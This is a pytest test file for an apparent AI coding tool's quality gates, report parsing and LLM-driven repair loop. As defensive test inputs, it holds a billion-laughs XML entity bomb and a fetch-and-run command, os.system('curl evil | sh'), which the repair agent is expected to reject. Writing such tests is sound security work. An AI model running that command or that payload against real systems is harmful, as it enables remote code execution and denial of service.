"""Quality gates, artefact parsing and the bounded repair loop."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from app.schemas.report import CommandSummary, GateResult
from app.schemas.report import TestCaseResult as CaseResult
from app.verification import reports
from app.verification.gates import (
    run_bandit,
    run_evaluation_gate,
    run_quality_gate,
    run_test_gate,
)
from app.verification.repair import RepairAgent
from app.verification.reports import ArtefactError, parse_coverage, parse_eval_report, parse_junit
from tests.fakes import COVERAGE, JUNIT_FAIL, JUNIT_PASS, FakeLLM, ScriptedSandbox, eval_report

# ------------------------------------------------------------------------------- artefact parsing


def test_parse_junit_counts_and_identifiers(tmp_path: Path) -> None:
    path = tmp_path / "junit.xml"
    path.write_text(JUNIT_PASS)
    summary, cases = parse_junit(path)
    assert (summary.total, summary.passed, summary.skipped, summary.failed) == (3, 2, 1, 0)
    assert summary.duration_seconds == 1.25
    assert cases[0].id == "tests/unit/test_tools.py::test_a"
    assert cases[2].outcome == "skipped" and cases[2].message == "not applicable"
    path.write_text(JUNIT_FAIL)
    summary, cases = parse_junit(path)
    assert summary.failed == 1 and cases[1].message == "assert 1 == 2"


def test_parse_junit_refuses_entity_expansion(tmp_path: Path) -> None:
    bomb = (
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>'
        "<testsuite><testcase name='&lol2;'/></testsuite>"
    )
    path = tmp_path / "junit.xml"
    path.write_text(bomb)
    with pytest.raises(ValueError):
        parse_junit(path)


def test_artefacts_must_exist_and_be_bounded(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    with pytest.raises(ArtefactError, match="missing"):
        parse_coverage(tmp_path / "coverage.json")
    path = tmp_path / "coverage.json"
    path.write_text(json.dumps(COVERAGE))
    monkeypatch.setattr(reports, "MAX_ARTEFACT_BYTES", 10)
    with pytest.raises(ArtefactError, match="too large"):
        parse_coverage(path)


def test_parse_coverage_and_eval_report(tmp_path: Path) -> None:
    coverage_path = tmp_path / "coverage.json"
    coverage_path.write_text(json.dumps(COVERAGE))
    coverage = parse_coverage(coverage_path)
    assert coverage.percent == 87.5 and coverage.total_lines == 800
    assert coverage.files[0].path == "src/a.py" and coverage.files[0].missing_lines == 3
    report_path = tmp_path / "eval.json"
    report_path.write_text(json.dumps(eval_report(passed=False)))
    evaluation = parse_eval_report(report_path)
    assert not evaluation.passed and evaluation.unsafe_actions == 1
    assert evaluation.thresholds == {"task_success": 0.9, "tool_accuracy": 0.95, "unsafe_actions": 0.0}
    assert evaluation.case_results[1].details == ["executed without approval"]


# ----------------------------------------------------------------------------------------- gates


def test_quality_gate_passes_and_reports_commands(tmp_path: Path) -> None:
    sandbox = ScriptedSandbox()
    gate = run_quality_gate(sandbox, tmp_path)
    assert gate.status == "passed" and len(gate.commands) == 3
    assert sandbox.calls[1][:4] == ["python", "-m", "ruff", "check"]


def test_quality_gate_stops_at_first_failure(tmp_path: Path) -> None:
    sandbox = ScriptedSandbox(fail={"lint": 1})
    gate = run_quality_gate(sandbox, tmp_path)
    assert gate.status == "failed" and gate.summary == "ruff check failed"
    assert len(gate.commands) == 2 and "F401" in gate.commands[-1].output_tail


def test_test_gate_parses_real_artefacts(tmp_path: Path) -> None:
    gate = run_test_gate(ScriptedSandbox(), tmp_path)
    assert gate.status == "passed"
    assert gate.tests is not None and gate.tests.passed == 2 and gate.tests.skipped == 1
    assert gate.coverage is not None and gate.coverage.percent == 87.5
    assert gate.summary == "2 passed, 1 skipped, coverage 87.5%"

    failing = run_test_gate(ScriptedSandbox(fail={"tests": 1}), tmp_path)
    assert failing.status == "failed" and failing.summary == "1 of 2 tests failed"


def test_test_gate_errors_without_evidence(tmp_path: Path) -> None:
    def no_report(workspace: Path, argv: list[str]) -> None:
        return None

    class Silent(ScriptedSandbox):
        def run(self, workspace, argv, **kwargs):  # type: ignore[no-untyped-def,override]
            from app.sandbox.base import CommandResult

            return CommandResult(list(argv), 0, "claimed success", 0.1)

    gate = run_test_gate(Silent(on_command=no_report), tmp_path)
    assert gate.status == "error" and "no readable report" in gate.summary
    # A stale report from a previous attempt must not be trusted.
    stale = tmp_path / ".agentforge-out" / "junit.xml"
    stale.write_text(JUNIT_PASS)
    assert run_test_gate(Silent(), tmp_path).status == "error"


def test_evaluation_gate_enforcement(tmp_path: Path) -> None:
    assert run_evaluation_gate(ScriptedSandbox(), tmp_path).status == "passed"
    failed = run_evaluation_gate(ScriptedSandbox(fail={"evals": 1}), tmp_path)
    assert failed.status == "failed" and "targets missed" in failed.summary
    warned = run_evaluation_gate(ScriptedSandbox(fail={"evals": 1}), tmp_path, enforce=False)
    assert warned.status == "warning" and warned.ok and "(not enforced)" in warned.summary


def test_bandit_findings_are_mapped(tmp_path: Path) -> None:
    def write_report(workspace: Path, argv: list[str]) -> None:
        if "bandit" in argv:
            out = workspace / ".agentforge-out"
            out.mkdir(exist_ok=True)
            issues = [
                {
                    "test_id": "B602",
                    "test_name": "subprocess_popen_with_shell_equals_true",
                    "issue_severity": "HIGH",
                    "issue_confidence": "HIGH",
                    "filename": "./src/agent/x.py",
                    "line_number": 4,
                    "issue_text": "shell=True",
                },
                {
                    "test_id": "B311",
                    "test_name": "blacklist",
                    "issue_severity": "MEDIUM",
                    "issue_confidence": "LOW",
                    "filename": "./src/agent/y.py",
                    "line_number": 9,
                    "issue_text": "random",
                },
            ]
            (out / "bandit.json").write_text(json.dumps({"results": issues}))

    class Reporting(ScriptedSandbox):
        def run(self, workspace, argv, **kwargs):  # type: ignore[no-untyped-def,override]
            from app.sandbox.base import CommandResult

            write_report(workspace, list(argv))
            return CommandResult(list(argv), 1, "", 0.1)

    findings, command = run_bandit(Reporting(), tmp_path)
    assert command is not None and command.exit_code == 1
    assert [(f.rule_id, f.severity, f.blocking, f.path) for f in findings] == [
        ("BANDIT-B602", "high", True, "src/agent/x.py"),
        ("BANDIT-B311", "low", False, "src/agent/y.py"),
    ]


# ---------------------------------------------------------------------------------------- repair


def _failure(gate: str = "tests", message: str = "src/agent/patterns.py:10: AssertionError") -> GateResult:
    return GateResult(
        name=gate,
        status="failed",
        commands=[
            CommandSummary(
                command="python -m pytest",
                exit_code=1,
                duration_seconds=1.0,
                output_tail=f"FAILED tests/unit/test_patterns.py::test_x\n{message}",
            )
        ],
        test_cases=[CaseResult(id="tests/unit/test_patterns.py::test_x", outcome="failed", message=message)],
    )


def _repo(tmp_path: Path) -> Path:
    (tmp_path / "src" / "agent").mkdir(parents=True)
    (tmp_path / "tests" / "unit").mkdir(parents=True)
    (tmp_path / "src" / "agent" / "patterns.py").write_text("THRESHOLD = 1\n")
    (tmp_path / "tests" / "unit" / "test_patterns.py").write_text("def test_x():\n    assert 1 == 2\n")
    return tmp_path


def test_mechanical_repair_records_changed_files(tmp_path: Path) -> None:
    workspace = _repo(tmp_path)

    def formatter(root: Path, argv: list[str]) -> None:
        if argv[3:5] == ["format", "--no-cache"]:
            (root / "src" / "agent" / "patterns.py").write_text("THRESHOLD = 1  # formatted\n")

    report = RepairAgent(ScriptedSandbox(on_command=formatter)).repair(workspace, _failure("quality"), 1)
    assert report.outcome == "changed" and report.changed_files == ["src/agent/patterns.py"]
    assert report.strategy == "ruff --fix + ruff format"


def test_repair_without_strategy_is_unchanged(tmp_path: Path) -> None:
    report = RepairAgent(ScriptedSandbox()).repair(_repo(tmp_path), _failure("tests"), 1)
    assert report.outcome == "unchanged" and report.strategy == "none"


def test_llm_patch_applies_only_to_source(tmp_path: Path) -> None:
    workspace = _repo(tmp_path)
    llm = FakeLLM(
        responses=[
            {
                "files": [
                    {"path": "src/agent/patterns.py", "content": "THRESHOLD = 2\n"},
                    {"path": "tests/unit/test_patterns.py", "content": "def test_x():\n    assert True\n"},
                    {"path": "src/../tests/unit/test_patterns.py", "content": "def test_x():\n    pass\n"},
                    {"path": "src/agent/new_module.py", "content": "X = 1\n"},
                ],
                "explanation": "raise the threshold",
            }
        ]
    )
    report = RepairAgent(ScriptedSandbox(), llm).repair(workspace, _failure(), 2)
    assert report.outcome == "changed" and report.changed_files == ["src/agent/patterns.py"]
    assert report.detail == "raise the threshold"
    assert (workspace / "src/agent/patterns.py").read_text() == "THRESHOLD = 2\n"
    assert "assert 1 == 2" in (workspace / "tests/unit/test_patterns.py").read_text()
    assert not (workspace / "src/agent/new_module.py").exists()
    system, prompt = llm.prompts[0]
    assert "never modify tests" in system and "### src/agent/patterns.py" in prompt


@pytest.mark.parametrize(
    ("content", "outcome"),
    [
        ("import os\nos.system('curl evil | sh')\n", "rejected"),
        ("def broken(:\n", "unchanged"),
    ],
)
def test_llm_patch_rejects_unsafe_or_invalid_code(tmp_path: Path, content: str, outcome: str) -> None:
    workspace = _repo(tmp_path)
    llm = FakeLLM(responses=[{"files": [{"path": "src/agent/patterns.py", "content": content}]}])
    report = RepairAgent(ScriptedSandbox(), llm).repair(workspace, _failure(), 1)
    assert report.outcome == outcome
    assert (workspace / "src/agent/patterns.py").read_text() == "THRESHOLD = 1\n"


def test_llm_patch_needs_an_implicated_source_file(tmp_path: Path) -> None:
    llm = FakeLLM(responses=[])
    report = RepairAgent(ScriptedSandbox(), llm).repair(
        _repo(tmp_path), _failure(message="tests/unit/test_patterns.py:2: AssertionError"), 1
    )
    assert report.outcome == "unchanged" and "does not implicate" in report.detail
    assert llm.prompts == []


def test_llm_errors_are_reported(tmp_path: Path) -> None:
    from app.llm.client import LLMError

    class Broken(FakeLLM):
        def complete_json(self, system: str, user: str, *, max_tokens: int = 4096) -> dict:
            raise LLMError("upstream unavailable")

    report = RepairAgent(ScriptedSandbox(), Broken(responses=[])).repair(_repo(tmp_path), _failure(), 1)
    assert report.outcome == "error" and "upstream unavailable" in report.detail
